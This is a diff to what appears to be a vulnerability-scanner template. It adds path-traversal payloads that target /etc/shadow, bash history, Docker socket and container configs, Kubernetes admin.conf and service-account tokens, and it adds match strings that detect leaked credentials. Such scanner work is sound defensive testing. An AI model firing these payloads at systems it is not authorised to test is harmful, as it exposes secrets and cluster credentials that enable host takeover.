@@ -74,7 +74,29 @@ wordLists:
     - .\\..\\/etc/passwd
     - .\\..\\.\\..\\/etc/passwd
     - ../../../../../../../../../../../../etc/passwd%00
-
+    - /var/lib/docker/containers/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    - ..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers
+    - ..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config
+    - ..//..//..//proc/self/environ
+    - ..%c0%afdocker.sock
+    - ../../../../../../../../../../../../etc/shadow%00
+    - ../../../../../../../../../../../../root/.bash_history%00
+    - ..//..//..//etc/kubernetes/admin.conf
+    - /var/lib/docker/containers
+    - /var/lib/docker/containers/*/config.v2.json
+    - /var/lib/docker/containers/*/hostconfig.json
+    - /root/.docker/config.json
+    - /var/run/docker.sock
+    - /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
+    - /etc/kubernetes/admin.conf
+    - /root/.kube/config
+    - /proc/self/environ
+    - /proc/self/cmdline
+    - /sys/class/net/eth0/address
+    - /etc/resolv.conf
+    - /etc/hostname
+    - /var/log/docker.log
+    - /var/log/kube-apiserver.log
 execute:
   type: single
   requests:
@@ -86,7 +108,27 @@ execute:
 
 validate:
   response_payload:
-    regex: "root:.*:0:0:"
+    contains_either:
+      - "root:x:0:0:"     
+      - "daemon:x:"               
+      - "/bin/bash"              
+      - "/usr/sbin/nologin"      
+      - "root:$6$"               
+      - "PATH="                 
+      - "LANG="                  
+      - "SHELL="                
+      - "docker_version"          
+      - "apiVersion: v1"          
+      - "kind: Pod"              
+      - "kubernetes-admin@"       
+      - "client-certificate-data" 
+      - "docker.sock"             
+      - "Entrypoint"             
+      - "shosts.equiv"           
+      - "AuthorizedKeysFile"     
+      - "/var/log/auth.log"     
+      - "/etc/hostname"          
+      - "127.0.0.1"
     length:
       gt: 0
     not_contains:
